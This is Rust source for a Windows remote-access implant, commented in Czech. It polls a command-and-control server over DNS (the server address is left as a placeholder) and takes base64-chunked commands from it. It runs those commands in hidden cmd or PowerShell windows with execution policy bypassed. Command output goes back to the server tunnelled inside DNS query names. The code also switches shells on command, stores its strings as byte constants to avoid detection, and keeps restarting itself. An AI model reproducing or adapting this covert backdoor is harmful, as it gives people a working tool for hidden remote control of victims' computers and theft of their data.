use std::net::{UdpSocket};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use rand::{Rng, thread_rng};
use rand::distributions::{Alphanumeric};
use std::io::{ErrorKind, Error as IoError};
use std::collections::HashMap;
use std::error::Error;
// Odstraněno: use std::num::ParseIntError; // Už není potřeba
use std::str;
use std::os::windows::process::CommandExt;
// Přidáno pro Mutex a Lazy
use std::sync::Mutex;
use once_cell::sync::Lazy;

// --- Konstanty ---
const C2_IP: &str = "0.0.0.0"; //Zadej adresu C2 serveru
const C2_PORT: u16 = 53;
const POLLING_INTERVAL: u64 = 5;
const ERR_SLEEP: u64 = 30;
const SOCKET_TIMEOUT_SECS: u64 = 10;

// --- Bajtové reprezentace stringů ---
const CMD_BYTES: &[u8] = b"cmd";
const CMD_ARG_BYTES: &[u8] = b"/C";
const POWERSHELL_BYTES: &[u8] = b"powershell.exe"; // Použít plný název
const PS_ARG1_BYTES: &[u8] = b"-NoProfile";
const PS_ARG2_BYTES: &[u8] = b"-ExecutionPolicy";
const PS_ARG3_BYTES: &[u8] = b"Bypass";
const PS_ARG4_BYTES: &[u8] = b"-Command";
// ... (ostatní bajtové konstanty stejné) ...
const REGISTER_BYTES: &[u8] = b"register";
const GETCOMMAND_BYTES: &[u8] = b"getcommand";
const RESPONSE_BYTES: &[u8] = b"response";
const EXAMPLE_COM_BYTES: &[u8] = b"example.com";
const NOCOMMAND_BYTES: &[u8] = b"nocommand";
const STDERR_TAG_BYTES: &[u8] = b"\n\n[stderr]\n";
const OK_NO_OUTPUT_BYTES: &[u8] = b"<OK (no output)>";
const SHELL_PREFIX_BYTES: &[u8] = b"shell::"; // Prefix pro speciální příkazy

// --- Globální stav pro Shell ---
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ShellType {
    Cmd,
    PowerShell,
}

// Použijeme Lazy<Mutex<>> pro bezpečnou inicializaci a přístup
static CURRENT_SHELL: Lazy<Mutex<ShellType>> = Lazy::new(|| Mutex::new(ShellType::Cmd));

// Pomocná funkce pro konverzi bajtů na &str
#[inline(always)]
fn bytes_to_str(bytes: &[u8]) -> &str { /* ... implementace stejná ... */
    str::from_utf8(bytes).unwrap()
}

// --- Struktury ---
#[derive(Debug)]
struct CommandAssembly { /* ... implementace stejná ... */
    total_parts: u32,
    received_parts: u32,
    parts_data: HashMap<u32, String>,
}
impl CommandAssembly { /* ... implementace stejná ... */
    fn new(total_parts: u32) -> Self { CommandAssembly { total_parts, received_parts: 0, parts_data: HashMap::new() } }
    fn add_part(&mut self, part_num: u32, data: String) -> bool { if self.parts_data.insert(part_num, data).is_none() { self.received_parts += 1; } self.is_complete() }
    fn is_complete(&self) -> bool { self.received_parts >= self.total_parts && self.parts_data.len() >= self.total_parts as usize }
    fn assemble_data(&self) -> Option<String> { if !self.is_complete() { return None; } let mut assembled = String::with_capacity(self.parts_data.values().map(|s| s.len()).sum()); for i in 1..=self.total_parts { if let Some(part_data) = self.parts_data.get(&i) { assembled.push_str(part_data); } else { return None; } } Some(assembled) }
}

// --- Přejmenované funkce ---
fn generate_id() -> String { /* ... implementace stejná ... */
    thread_rng().sample_iter(&Alphanumeric).take(8).map(char::from).collect()
}

// *** ZMĚNA: run_task nyní používá CURRENT_SHELL ***
fn run_task(task: &str) -> Vec<u8> {
    // Získat aktuální shell (krátkodobý zámek)
    let shell_type = {
        let guard = CURRENT_SHELL.lock().unwrap();
        *guard // Zkopírovat hodnotu enum (je Copy)
    };

    let command_res = match shell_type {
        ShellType::Cmd => {
            Command::new(bytes_to_str(CMD_BYTES))
                .args(&[bytes_to_str(CMD_ARG_BYTES), task])
                .stdout(Stdio::piped()).stderr(Stdio::piped())
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .output()
        }
        ShellType::PowerShell => {
            Command::new(bytes_to_str(POWERSHELL_BYTES))
                .args(&[
                    bytes_to_str(PS_ARG1_BYTES), // -NoProfile
                    bytes_to_str(PS_ARG2_BYTES), // -ExecutionPolicy
                    bytes_to_str(PS_ARG3_BYTES), // Bypass
                    bytes_to_str(PS_ARG4_BYTES), // -Command
                    task // Samotný příkaz
                ])
                .stdout(Stdio::piped()).stderr(Stdio::piped())
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .output()
        }
    };

    // Zpracování výsledku zůstává stejné
    match command_res {
        Ok(output) => { /* ... implementace stejná jako předtím ... */
            let mut result_bytes = Vec::new();
            if !output.stdout.is_empty() { result_bytes.extend_from_slice(&output.stdout); }
            if !output.stderr.is_empty() {
                if !result_bytes.is_empty() { result_bytes.extend_from_slice(STDERR_TAG_BYTES); }
                result_bytes.extend_from_slice(&output.stderr);
            }
            if result_bytes.is_empty() {
                result_bytes = if output.status.success() { OK_NO_OUTPUT_BYTES.to_vec() }
                else { format!("<ERR {} (no output)>", output.status.code().unwrap_or(-1)).into_bytes() };
            }
            result_bytes
        },
        Err(_) => Vec::new() // Při chybě spuštění vrátit prázdný vektor
    }
}

fn split_data(data_str: &str) -> Vec<String> { /* ... implementace stejná ... */
    let mut res = Vec::new(); let max_l = 60;
    for chunk in data_str.as_bytes().chunks(max_l) { res.push(str::from_utf8(chunk).unwrap().to_string()); } res
}

fn create_dns_packet(query_target: &str) -> Vec<u8> { /* ... implementace stejná ... */
    let mut packet_buf = Vec::with_capacity(query_target.len() + 30);
    packet_buf.extend_from_slice(&thread_rng().gen::<u16>().to_be_bytes());
    packet_buf.extend_from_slice(&0x0100u16.to_be_bytes()); packet_buf.extend_from_slice(&1u16.to_be_bytes());
    packet_buf.extend_from_slice(&0u16.to_be_bytes()); packet_buf.extend_from_slice(&0u16.to_be_bytes());
    packet_buf.extend_from_slice(&0u16.to_be_bytes());
    for part in query_target.split('.') { let part_bytes = part.as_bytes(); let len = part_bytes.len() as u8; if len > 63 { } packet_buf.push(len); packet_buf.extend_from_slice(part_bytes); }
    packet_buf.push(0); packet_buf.extend_from_slice(&16u16.to_be_bytes()); packet_buf.extend_from_slice(&1u16.to_be_bytes()); packet_buf
}

fn parse_resp(resp_bytes: &[u8]) -> Option<String> { /* ... implementace stejná ... */
    if resp_bytes.len() < 12 || (resp_bytes[3] & 0x0F) != 0 || u16::from_be_bytes([resp_bytes[6], resp_bytes[7]]) == 0 { return None; }
    let qdcount = u16::from_be_bytes([resp_bytes[4], resp_bytes[5]]); let mut pos = 12;
    for _ in 0..qdcount { loop { if pos >= resp_bytes.len() { return None; } if (resp_bytes[pos] & 0xC0) == 0xC0 { if pos + 1 >= resp_bytes.len() { return None; } pos += 2; break; } else { let len = resp_bytes[pos] as usize; if len == 0 { pos += 1; break; } if pos + len + 1 >= resp_bytes.len() { return None; } pos += len + 1; } } if pos + 4 > resp_bytes.len() { return None; } pos += 4; }
    if pos >= resp_bytes.len() { return None; } loop { if pos >= resp_bytes.len() { return None; } if (resp_bytes[pos] & 0xC0) == 0xC0 { if pos + 1 >= resp_bytes.len() { return None; } pos += 2; break; } else { let len = resp_bytes[pos] as usize; if len == 0 { pos += 1; break; } if pos + len + 1 >= resp_bytes.len() { return None; } pos += len + 1; } }
    if pos + 10 > resp_bytes.len() { return None; } let rtype = u16::from_be_bytes([resp_bytes[pos], resp_bytes[pos+1]]); let rdlength = u16::from_be_bytes([resp_bytes[pos+8], resp_bytes[pos+9]]); pos += 10;
    if rtype != 16 || pos + rdlength as usize > resp_bytes.len() { return None; }
    if rdlength == 0 { return Some(String::new()); } let txt_len = resp_bytes[pos] as usize; pos += 1;
    if txt_len > (rdlength as usize).saturating_sub(1) || pos + txt_len > resp_bytes.len() { return None; }
    Some(String::from_utf8_lossy(&resp_bytes[pos..pos + txt_len]).to_string())
}

fn send_chunk(sock: &UdpSocket, cmd_id: u32, part: u32, total: u32, data: &str) -> Result<(), Box<dyn Error>> { /* ... implementace stejná ... */
    let d_name = format!("{}.{}.{}.{}.{}.{}", bytes_to_str(RESPONSE_BYTES), cmd_id, part, total, data, bytes_to_str(EXAMPLE_COM_BYTES));
    let query = create_dns_packet(&d_name); sock.send_to(&query, format!("{}:{}", C2_IP, C2_PORT))?; Ok(())
}

// --- Hlavní logika ---
fn main() -> Result<(), Box<dyn Error>> { /* ... implementace stejná ... */
    loop {
        let res = std::panic::catch_unwind(|| { if let Err(_) = run_client_logic() { thread::sleep(Duration::from_secs(ERR_SLEEP)); } });
        if res.is_err() { thread::sleep(Duration::from_secs(ERR_SLEEP * 2)); } thread::sleep(Duration::from_secs(ERR_SLEEP));
    }
}

// *** ZMĚNA: run_client_logic rozpoznává shell:: příkazy ***
fn run_client_logic() -> Result<(), Box<dyn Error>> {
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_read_timeout(Some(Duration::from_secs(SOCKET_TIMEOUT_SECS)))?;
    let mut command_assembler: HashMap<u32, CommandAssembly> = HashMap::new();
    let client_id = format!("win_{}", generate_id());
    register_client(&socket, &client_id)?;

    loop { // Hlavní smyčka dotazování
        thread::sleep(Duration::from_secs(POLLING_INTERVAL));
        match get_task(&socket) {
            Ok(Some(response_data)) => {
                let parts: Vec<&str> = response_data.splitn(4, '|').collect();
                if parts.len() == 4 {
                    if let (Ok(cmd_id), Ok(part_num), Ok(total_parts)) = (parts[0].parse(), parts[1].parse(), parts[2].parse()) {
                        if total_parts == 0 { continue; }
                        let data_part = parts[3].to_string();
                        let assembly = command_assembler.entry(cmd_id).or_insert_with(|| CommandAssembly::new(total_parts));
                        if assembly.total_parts != total_parts { *assembly = CommandAssembly::new(total_parts); }

                        if assembly.add_part(part_num, data_part) { // Příkaz je kompletní
                            if let Some(assembled_base64) = assembly.assemble_data() {
                                if let Ok(decoded_bytes) = BASE64.decode(assembled_base64) {
                                    let command_text = String::from_utf8_lossy(&decoded_bytes);

                                    // *** ZMĚNA: Kontrola speciálních příkazů pro shell ***
                                    let shell_prefix_str = bytes_to_str(SHELL_PREFIX_BYTES); // "shell::"
                                    if command_text.starts_with(shell_prefix_str) {
                                        let shell_cmd = command_text.strip_prefix(shell_prefix_str).unwrap_or("").trim();
                                        // Získat zámek a změnit shell
                                        let mut shell_guard = CURRENT_SHELL.lock().expect("Mutex poisoned"); // Ošetření paniky mutexu
                                        if shell_cmd.eq_ignore_ascii_case("ps") || shell_cmd.eq_ignore_ascii_case("powershell") {
                                            *shell_guard = ShellType::PowerShell;
                                        } else if shell_cmd.eq_ignore_ascii_case("cmd") {
                                             *shell_guard = ShellType::Cmd;
                                        }
                                        // Nepokračovat v provedení "shell::" jako běžného příkazu
                                    } else {
                                        // Spustit běžný příkaz
                                        let result_output_bytes: Vec<u8> = run_task(&command_text);
                                        if !result_output_bytes.is_empty() {
                                            let encoded_result: String = BASE64.encode(&result_output_bytes);
                                            let result_parts: Vec<String> = split_data(&encoded_result);
                                            let total_result_parts = result_parts.len() as u32;
                                            for (i, part) in result_parts.iter().enumerate() {
                                                let part_idx = (i + 1) as u32;
                                                let _ = send_chunk(&socket, cmd_id, part_idx, total_result_parts, part);
                                                thread::sleep(Duration::from_millis(50 + thread_rng().gen_range(0..50)));
                                            }
                                        }
                                    }
                                }
                            }
                            command_assembler.remove(&cmd_id); // Odebrat buffer vždy po zpracování
                        }
                    }
                }
            }
            Ok(None) => {} // Nocommand
            Err(ref e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {} // Očekávaný timeout
            Err(_) => { return Err(Box::new(IoError::new(ErrorKind::Other, "Socket IO error"))); }
        }
    }
}


fn register_client(socket: &UdpSocket, client_id: &str) -> Result<(), Box<dyn Error>> { /* ... implementace stejná ... */
    let d_name = format!("{}.{}.{}", bytes_to_str(REGISTER_BYTES), client_id, bytes_to_str(EXAMPLE_COM_BYTES));
    let query = create_dns_packet(&d_name); socket.send_to(&query, format!("{}:{}", C2_IP, C2_PORT))?; Ok(())
}

fn get_task(socket: &UdpSocket) -> Result<Option<String>, IoError> { /* ... implementace stejná ... */
    let d_name = format!("{}.{}.{}", bytes_to_str(GETCOMMAND_BYTES), generate_id(), bytes_to_str(EXAMPLE_COM_BYTES));
    let query = create_dns_packet(&d_name); socket.send_to(&query, format!("{}:{}", C2_IP, C2_PORT))?;
    let mut buf = [0u8; 512]; match socket.recv_from(&mut buf) { Ok((n, _)) => match parse_resp(&buf[..n]) { Some(resp) if !resp.trim().eq_ignore_ascii_case(bytes_to_str(NOCOMMAND_BYTES)) => Ok(Some(resp)), _ => Ok(None) }, Err(e) => Err(e) }
}